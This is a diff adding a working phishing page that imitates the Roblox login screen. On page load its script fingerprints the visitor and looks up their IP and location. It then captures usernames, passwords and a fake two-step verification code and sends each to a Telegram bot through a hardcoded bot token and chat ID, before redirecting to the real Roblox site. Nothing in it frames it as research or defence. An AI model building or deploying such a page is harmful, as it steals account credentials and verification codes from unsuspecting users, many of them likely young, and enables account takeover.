@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox – Log in</title>
+  <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
+      color: #e0e0ff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .container {
+      background: rgba(20, 20, 40, 0.92);
+      backdrop-filter: blur(12px);
+      border-radius: 16px;
+      padding: 48px 40px;
+      width: 100%;
+      max-width: 420px;
+      border: 1px solid rgba(0, 162, 255, 0.18);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+      animation: fadeIn 0.8s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .logo {
+      width: 140px;
+      margin: 0 auto 32px;
+      display: block;
+    }
+    h1 {
+      font-size: 32px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 12px;
+      color: #fff;
+    }
+    .subtitle {
+      text-align: center;
+      color: #a0a0ff;
+      margin-bottom: 36px;
+      font-size: 16px;
+    }
+    .input-group {
+      margin-bottom: 24px;
+      position: relative;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #d0d0ff;
+      font-weight: 500;
+    }
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1px solid rgba(0, 162, 255, 0.3);
+      border-radius: 8px;
+      background: rgba(30, 30, 50, 0.7);
+      color: white;
+      outline: none;
+      transition: all 0.25s;
+    }
+    input:focus {
+      border-color: #00a2ff;
+      box-shadow: 0 0 0 4px rgba(0, 162, 255, 0.2);
+    }
+    .btn {
+      width: 100%;
+      padding: 16px;
+      font-size: 18px;
+      font-weight: 600;
+      background: linear-gradient(90deg, #00a2ff, #0077cc);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-top: 12px;
+    }
+    .btn:hover {
+      background: linear-gradient(90deg, #0088ff, #0055aa);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(0, 162, 255, 0.35);
+    }
+    .status {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 15px;
+      min-height: 24px;
+    }
+    .success { color: #00ff88; }
+    .error   { color: #ff5555; }
+
+    .step-2 { display: none; }
+    .back-link {
+      color: #00a2ff;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 20px;
+      display: inline-block;
+    }
+    .back-link:hover { text-decoration: underline; }
+    .loading {
+      text-align: center;
+      font-size: 18px;
+      color: #00a2ff;
+      margin: 40px 0;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="loading">
+    <div class="loading">Loading Roblox... Please wait</div>
+  </div>
+
+  <div class="container" id="step1" style="display:none;">
+    <img class="logo" src="https://www.roblox.com/images/logo.png" alt="Roblox"/>
+    <h1>Log in to Roblox</h1>
+    <p class="subtitle">Enter your credentials to continue to your account</p>
+
+    <form id="loginForm">
+      <div class="input-group">
+        <label for="username">Username or Email</label>
+        <input type="text" id="username" placeholder="Username or Email" autocomplete="off" required>
+      </div>
+
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Password" autocomplete="off" required>
+      </div>
+
+      <button type="submit" class="btn">Log In</button>
+    </form>
+
+    <div class="status" id="status"></div>
+  </div>
+
+  <!-- Fake 2-Step Verification step -->
+  <div class="container step-2" id="step2" style="display:none;">
+    <img class="logo" src="https://www.roblox.com/images/logo.png" alt="Roblox"/>
+    <h1>Two-Step Verification</h1>
+    <p class="subtitle">Enter the code sent to your email or authenticator app</p>
+
+    <form id="verifyForm">
+      <div class="input-group">
+        <label for="code">Verification Code</label>
+        <input type="text" id="code" placeholder="6-digit code" maxlength="6" autocomplete="off" required>
+      </div>
+
+      <button type="submit" class="btn">Verify</button>
+    </form>
+
+    <a href="#" class="back-link" onclick="showStep1()">Back to login</a>
+    <div class="status" id="verifyStatus"></div>
+  </div>
+
+  <script>
+    // Replace these with your real Telegram bot details
+    const botToken = '8334158147:AAHDWzsU87L9hzZhCZBCB9RA03Cb6uO59Gs';  // from BotFather
+    const chatId   = '6418644280';    // your chat ID or channel/group ID
+
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+      try {
+        await fetch(url);
+      } catch (err) {
+        console.error('Telegram send error:', err);
+      }
+    }
+
+    // 1. Send maximum fingerprint & metadata as soon as page loads
+    window.addEventListener('load', async () => {
+      const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+
+      const fingerprint = {
+        canvas: await getCanvasFingerprint(),
+        userAgent: navigator.userAgent,
+        language: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+        platform: navigator.platform,
+        screen: `\( {screen.width}× \){screen.height} (${screen.colorDepth} bit)`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'direct',
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        timestamp: new Date().toLocaleString('en-US')
+      };
+
+      const text = `🔥 PAGE OPENED (MAX FINGERPRINT) 🔥\n\n` +
+        `<b>IP:</b> ${ipData.ip || 'hidden'}\n` +
+        `<b>Location:</b> ${ipData.city || '?'} / ${ipData.country_name || '?'}\n` +
+        `<b>ISP:</b> ${ipData.org || '?'}\n` +
+        `<b>User-Agent:</b> ${fingerprint.userAgent}\n` +
+        `<b>Languages:</b> ${fingerprint.language}\n` +
+        `<b>Platform:</b> ${fingerprint.platform}\n` +
+        `<b>Screen:</b> ${fingerprint.screen}\n` +
+        `<b>Timezone:</b> ${fingerprint.timezone}\n` +
+        `<b>Referrer:</b> ${fingerprint.referrer}\n` +
+        `<b>Cookies enabled:</b> ${fingerprint.cookiesEnabled}\n` +
+        `<b>Do Not Track:</b> ${fingerprint.doNotTrack}\n` +
+        `<b>CPU cores:</b> ${fingerprint.hardwareConcurrency}\n` +
+        `<b>RAM (GB):</b> ${fingerprint.deviceMemory}\n` +
+        `<b>Canvas Fingerprint:</b> ${fingerprint.canvas}\n` +
+        `<b>Time:</b> ${fingerprint.timestamp}`;
+
+      await sendToTelegram(text);
+
+      // Hide loading, show login
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('step1').style.display = 'block';
+    });
+
+    async function getCanvasFingerprint() {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('Hello, world!', 2, 15);
+      ctx.fillStyle = 'rgba(102,204,0,0.7)';
+      ctx.fillText('Hello, world!', 4, 17);
+      const data = canvas.toDataURL();
+      const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(data));
+      return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 32);
+    }
+
+    // 2. Capture username + password when submitted
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const status = document.getElementById('status');
+
+      if (!username || !password) {
+        status.textContent = 'Please fill in all fields';
+        status.className = 'status error';
+        return;
+      }
+
+      status.textContent = 'Verifying credentials...';
+      status.className = 'status';
+
+      sendToTelegram(`🔥 LOGIN CAPTURED 🔥\n\n<b>Username/Email:</b> ${username}\n<b>Password:</b> ${password}\nTime: ${new Date().toLocaleString('en-US')}`);
+
+      // Show fake 2FA
+      document.getElementById('step1').style.display = 'none';
+      document.getElementById('step2').style.display = 'block';
+    });
+
+    // 3. Fake 2FA submit (sends the fake code too)
+    document.getElementById('verifyForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const code = document.getElementById('code').value.trim();
+      const status = document.getElementById('verifyStatus');
+
+      if (!code || code.length !== 6) {
+        status.textContent = 'Enter a valid 6-digit code';
+        status.className = 'status error';
+        return;
+      }
+
+      status.textContent = 'Verifying code...';
+      status.className = 'status';
+
+      sendToTelegram(`🔥 FAKE 2FA CODE ENTERED 🔥\n<b>Code:</b> ${code}\nTime: ${new Date().toLocaleString('en-US')}`);
+
+      setTimeout(() => {
+        status.textContent = 'Login successful! Redirecting...';
+        status.className = 'status success';
+        setTimeout(() => {
+          window.location.href = 'https://www.roblox.com/home';
+        }, 1800);
+      }, 1200);
+    });
+
+    function showStep1() {
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step1').style.display = 'block';
+      document.getElementById('status').textContent = '';
+    }
+  </script>
+
+</body>
+</html>
